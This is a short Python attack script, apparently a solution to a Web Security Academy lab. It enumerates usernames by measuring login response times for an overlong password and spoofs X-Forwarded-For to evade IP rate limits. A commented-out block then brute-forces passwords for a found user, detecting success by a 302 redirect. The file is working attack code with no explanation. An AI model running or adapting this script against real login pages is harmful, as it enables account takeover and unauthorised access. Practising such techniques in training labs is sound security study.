import requests
import time
url = 'https://0a27002a04cee09cc0370c6300cb0095.web-security-academy.net/login'
file = open('../shortlist/usernames.txt','r')
username = file.readline().strip()

for i in range(101):
    a = time.time()
    x = requests.post(url, data={'username': username, 'password': 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'}, headers={'X-Forwarded-For': '118.71.204.'+ str(i)})
    if (time.time() - a > 3 ):
        print(username)
        break
    username = file.readline().strip()

# import requests
# import time
# url = 'https://0a27002a04cee09cc0370c6300cb0095.web-security-academy.net/login'
# file = open('../shortlist/passwords.txt','r')
# password = file.readline().strip()

# for i in range(101):
#     a = time.time()
#     x = requests.post(url, data={'username': 'al', 'password': password}, headers={'X-Forwarded-For': '118.71.204.'+ str(i)})
#     if (x.status_code == 302):
#         print(password)
#         break
#     password = file.readline().strip()